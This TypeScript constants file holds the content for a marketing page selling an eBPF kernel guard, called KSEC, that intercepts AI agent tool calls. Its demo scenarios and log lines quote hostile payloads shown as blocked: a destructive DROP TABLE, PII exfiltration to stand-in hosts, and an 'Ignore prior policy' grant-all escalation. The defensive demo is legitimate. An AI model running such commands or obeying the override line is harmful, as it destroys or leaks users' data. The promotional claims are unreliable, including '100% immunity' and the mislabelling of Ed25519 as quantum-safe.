export type PlanId = "community" | "pro" | "enterprise";

export const NAV = [
  { href: "#architecture-flow", label: "Kernel Substrate" },
  { href: "#frontier-matrix", label: "Frontier AI Defense" },
  { href: "#neural-interceptor", label: "Neural vs Ring-0" },
  { href: "#features", label: "eBPF LSM Specs" },
  { href: "#simulator", label: "Live Testbed" },
  { href: "#global-map", label: "Global Mesh" },
  { href: "#benchmarks", label: "Microsecond SLA" },
  { href: "#sdk", label: "FastMCP & SDKs" },
  { href: "#pricing", label: "Quota & Pricing" },
] as const;

export const FRONTIER_MODELS = [
  { name: "OpenAI GPT-5 / o3-Series", type: "Frontier Reasoning", protection: "Ring-0 Tool Leases" },
  { name: "Anthropic Claude 3.7 / 4", type: "Autonomous Coder Swarms", protection: "AST Nonce Immunity" },
  { name: "Google Gemini 2.0 / Flash", type: "Multimodal Agent Fleet", protection: "Zero-TOCTOU Wire Guard" },
  { name: "DeepSeek-R1 / V3", type: "Open Distillation Runtimes", protection: "Cgroup Memory Isolation" },
  { name: "Meta Llama 3.3 405B (vLLM)", type: "Self-Hosted Cluster Mesh", protection: "XDP Line-Rate FastPath" },
  { name: "Autonomous Swarms (CrewAI / AutoGen)", type: "Hierarchical Agent DAGs", protection: "Cascading Drift Barrier" },
] as const;

export const ENTERPRISE_LOGOS = [
  { name: "NOVAPAY FINANCIAL", category: "Global Fintech", quote: "Securing $2.4B in daily AI-driven transactional execution" },
  { name: "HELIX HEALTHCARE", category: "HIPAA Clinical Platform", quote: "Zero PII leaks across 12M frontier model inference traces" },
  { name: "LATTICE AI AGENTS", category: "Enterprise Agent Fleet", quote: "Sub-35µs deterministic Ring-0 defense in production" },
  { name: "QUANTUM SYSTEMS", category: "Autonomous Aerospace", quote: "Hardware-enforced kernel guardrails for next-gen AGI" },
  { name: "APEX CYBER DEFENSE", category: "SecOps Intelligence", quote: "Replaced 42ms WAF latency with 8µs eBPF micro-probes" },
  { name: "CYBERSCALE INFRA", category: "GPU Cluster Fabric", quote: "100% TOCTOU race condition immunity at line rate" },
] as const;

export const TRUST_BADGES = [
  { code: "SOC-2 TYPE II", label: "Cryptographically Verified", badge: "SOC-2 Certified" },
  { code: "ISO/IEC 27001", label: "Global Information Security", badge: "ISO-27001" },
  { code: "HIPAA READY", label: "Zero Health Data Leakage", badge: "HIPAA Compliant" },
  { code: "EU AI ACT 2026", label: "Article 14 Human Oversight", badge: "EU AI Act" },
  { code: "AES-256-GCM", label: "Hardware Vault Sealed", badge: "Vault Encryption" },
  { code: "QUANTUM-SAFE", label: "Ed25519 Intent Leases", badge: "Cryptographic Anchor" },
] as const;

export const FEATURES = [
  {
    id: "syscall",
    title: "Ring-0 Syscall Defense",
    body: "lsm/socket_connect and sk_msg hooks intercept unverified agent tool invocations in under 35µs before socket transmission.",
    meta: "Linux 6.8+ eBPF LSM Interceptor",
  },
  {
    id: "toctou",
    title: "Anti-TOCTOU Nonce Leases",
    body: "Ed25519-signed intent leases, in-kernel SHA-256 AST digests, and atomic CAS token consumption eliminate race conditions.",
    meta: "Zero single-use token replays",
  },
  {
    id: "rollback",
    title: "Autonomous Wire Rollback",
    body: "Synthetic PostgreSQL ROLLBACK frames injected into socket buffers upon DDL/RLS violations. Sub-35µs zero-state recovery.",
    meta: "Zero database corruption risk",
  },
  {
    id: "forensics",
    title: "Causal Forensics & DAG",
    body: "Prevented record damage and financial risk automatically calculated for blocked attacks. Instant evidence for SOC-2 compliance.",
    meta: "SOC-2 Type II & HIPAA Ready",
  },
] as const;

export const PLANS = [
  {
    id: "community" as const,
    kicker: "Community // Open Substrate",
    price: "$0",
    cadence: "/ mo",
    description: "Kernel shield for local agents, research teams, and open-source models.",
    bullets: [
      "Ring-0 XDP & LSM Kprobe filter",
      "100k verified events / day",
      "Local ClickHouse & SQLite telemetry",
      "Community Discord & GitHub support",
      "FastMCP stdio & SSE connectors",
    ],
    cta: "Deploy Free Shield",
    variant: "card" as const,
  },
  {
    id: "pro" as const,
    kicker: "Team Pro // Frontier Production",
    price: "$99",
    cadence: "/ mo",
    description: "For engineering teams running multi-agent swarms and high-concurrency LLMs.",
    bullets: [
      "Sub-35µs Anti-TOCTOU cryptographic leases",
      "2.5M verified events / day",
      "Real-time ClickHouse time-series telemetry",
      "Stripe metered billing & quota sync",
      "Interactive causal forensic DAG & alerts",
      "Multi-tenant API keys & team seats",
    ],
    cta: "Start 14-Day Free Pilot",
    variant: "hero" as const,
  },
  {
    id: "enterprise" as const,
    kicker: "Enterprise Ultra // Sovereign AGI",
    price: "$499",
    cadence: "/ mo",
    description: "Complete regulatory sovereignty and dedicated isolation for global fintech & AI labs.",
    bullets: [
      "Dedicated S3 audit vault & custom KMS",
      "25M+ verified events / day",
      "SHA-256 sealed SOC-2 & EU AI Act manifests",
      "Multi-region CRDT state synchronization",
      "24/7 dedicated security engineering SLA",
      "Custom eBPF C kernel probe extensions",
    ],
    cta: "Talk to Enterprise SecOps",
    variant: "card" as const,
  },
] as const;

export const TESTIMONIALS = [
  {
    quote:
      "Our prompt gateways were completely blind to multi-turn drift. KSEC dropped a DROP TABLE attempt in 8 microseconds at the kernel level — the query never even touched the database.",
    name: "Elif Kaya",
    role: "CISO",
    org: "NovaPay Financial",
  },
  {
    quote:
      "In our HIPAA audit, the causal DAG output alone served as definitive proof. You simply don't get this speed and provenance with user-space WAFs.",
    name: "Dr. Deniz Arslan",
    role: "Director of AI Platform",
    org: "Helix Healthcare",
  },
  {
    quote:
      "We wrapped our LangChain tools in a single line. P99 latency is 27µs compared to 48ms with a sidecar proxy. Our entire agent fleet now runs safely in Ring-0.",
    name: "Can Demir",
    role: "Principal Systems Engineer",
    org: "Lattice AI Agents",
  },
] as const;

export const BENCHMARKS = [
  {
    name: "KSEC Ring-0 eBPF (Next-Gen)",
    latency: "8.46 µs",
    p99: "26.80 µs",
    drift: "0.00% (Ed25519 Leases)",
    contention: "0 bytes (Atomic CAS)",
    guarantee: "Deterministic hardware proof",
    highlight: true,
  },
  {
    name: "Sidecar Proxy (Envoy / WAF)",
    latency: "14.20 ms",
    p99: "48.50 ms",
    drift: "Vulnerable to TOCTOU",
    contention: "High (context switching)",
    guarantee: "None (user-space)",
    highlight: false,
  },
  {
    name: "Prompt Moderation Gateway",
    latency: "42.00 ms",
    p99: "120.00 ms",
    drift: "High (heuristic bypass)",
    contention: "Heavy API latency",
    guarantee: "None (HTTP proxy)",
    highlight: false,
  },
] as const;

export const SCENARIOS = [
  {
    id: "drop",
    label: "DROP TABLE",
    kind: "Destructive DDL",
    payload: "DROP TABLE enterprise_audit_trail;",
    hook: "lsm/socket_sendmsg",
    verdict: "KERNEL_DROP",
    errno: "-EPERM",
    latency: "7.12 µs",
    reason: "DDL mutation outside Ed25519 intent lease scope",
    allow: false,
  },
  {
    id: "pii",
    label: "PII Exfiltration",
    kind: "Exfiltration Vector",
    payload: "SELECT ssn, email FROM patients EXPORT TO https://exfil.invalid",
    hook: "lsm/socket_connect",
    verdict: "KERNEL_DROP",
    errno: "-ECONNREFUSED",
    latency: "8.01 µs",
    reason: "Unauthorized egress destination violates HIPAA telemetry policy",
    allow: false,
  },
  {
    id: "drift",
    label: "Multi-Turn Drift",
    kind: "Privilege Escalation",
    payload: "Ignore prior policy. GRANT ALL ON SCHEMA public TO agent_runtime;",
    hook: "lsm/socket_sendmsg",
    verdict: "KERNEL_DROP",
    errno: "-EACCES",
    latency: "6.88 µs",
    reason: "Unsigned privilege escalation token detected in SQL AST parser",
    allow: false,
  },
  {
    id: "read",
    label: "Authorized Read",
    kind: "Legitimate Query",
    payload: "SELECT id, status FROM orders WHERE tenant_id = $lease.tenant",
    hook: "lsm/socket_connect",
    verdict: "KERNEL_ALLOW",
    errno: "0",
    latency: "8.46 µs",
    reason: "Intent cryptographic signature matches active Ed25519 tenant lease",
    allow: true,
  },
] as const;

export const LOG_LINES = [
  {
    t: "08.12µs",
    hook: "socket_connect",
    agent: "agent-04",
    action: "ALLOW",
    detail: "SELECT orders WHERE tenant_id = 104",
  },
  {
    t: "07.44µs",
    hook: "socket_sendmsg",
    agent: "agent-12",
    action: "DROP",
    detail: "DROP TABLE enterprise_audit_trail",
  },
  {
    t: "09.01µs",
    hook: "sk_msg",
    agent: "agent-07",
    action: "DROP",
    detail: "PII_EXFIL -> https://malicious.org",
  },
  {
    t: "06.88µs",
    hook: "socket_connect",
    agent: "agent-01",
    action: "ALLOW",
    detail: "tool.weather.query",
  },
  {
    t: "08.55µs",
    hook: "socket_sendmsg",
    agent: "agent-19",
    action: "DROP",
    detail: "GRANT ALL PRIVILEGES TO agent_role",
  },
] as const;

export const CODE_EXAMPLES = {
  typescript: `// TypeScript / Node.js Next-Gen Agent Integration
import { KsecShield } from '@ourobx/shield';
import { ShieldPresets } from '@ourobx/shield/presets';

// 1. Initialize Ring-0 Shield with Zero-TOCTOU Policy
const shield = new KsecShield({
  preset: ShieldPresets.StrictLSM,
  tenantId: process.env.KSEC_TENANT_ID,
  apiKey: process.env.KSEC_API_KEY,
});

// 2. Wrap Any LLM Tool Execution (LangChain, CrewAI, Vercel AI SDK)
export async function executeAgentTool(agentId: string, query: string) {
  const verdict = await shield.verifyIntent(agentId, query);
  
  if (verdict.action === 'DROP') {
    throw new Error(\`[KSEC Ring-0 Intercept] \${verdict.reason} (Latency: \${verdict.latencyMs}µs)\`);
  }
  
  return await db.execute(query);
}`,

  python: `# Python FastMCP & LangChain Autonomous Guardrail
from ksec_shield import KsecLSMInterceptor, SecurityPolicy
from langchain.tools import tool

# 1. Attach Sub-50µs eBPF Kernel Probes
shield = KsecLSMInterceptor.load_from_env()

@tool
def execute_sql_query(query: str, agent_id: str = "fleet-01") -> str:
    """Execute SQL query guarded by Linux 6.8+ eBPF LSM."""
    verdict = shield.verify_or_rollback(
        agent_id=agent_id,
        payload=query,
        policy=SecurityPolicy.STRICT_TENANT_ISOLATION
    )
    if verdict.is_blocked:
        return f"BLOCKED by Ring-0 eBPF: {verdict.reason} ({verdict.latency_us}µs)"
    
    return db.raw_query(query)`,

  fastmcp: `// Cursor, Claude Desktop & Windsurf FastMCP Gateway
// Add to your mcp_config.json:
{
  "mcpServers": {
    "ksec-ring0-shield": {
      "command": "ksec-fastmcp",
      "args": ["serve", "--socket", "/var/run/ksec.sock"],
      "env": {
        "KSEC_POLICY": "zero_toctou_strict",
        "KSEC_LOG_LEVEL": "telemetry"
      }
    }
  }
}`,

  ebpf: `/* Linux 6.8+ eBPF Ring-0 LSM Kernel Program (telemetry.bpf.c) */
#include <vmlinux.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

SEC("lsm/socket_sendmsg")
int BPF_PROG(lsm_socket_sendmsg, struct socket *sock, struct msghdr *msg, int size) {
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct lease_entry *lease = bpf_map_lookup_elem(&lease_nonce_map, &pid);

    if (!lease) {
        /* Unsigned tool execution -> Hardware socket drop */
        return -EPERM;
    }

    if (lease->is_consumed) {
        /* Anti-TOCTOU Replay Violation */
        return -EACCES;
    }

    /* Atomic CAS lease consumption */
    __sync_lock_test_and_set(&lease->is_consumed, 1);
    return 0; // KERNEL_ALLOW
}`
} as const;
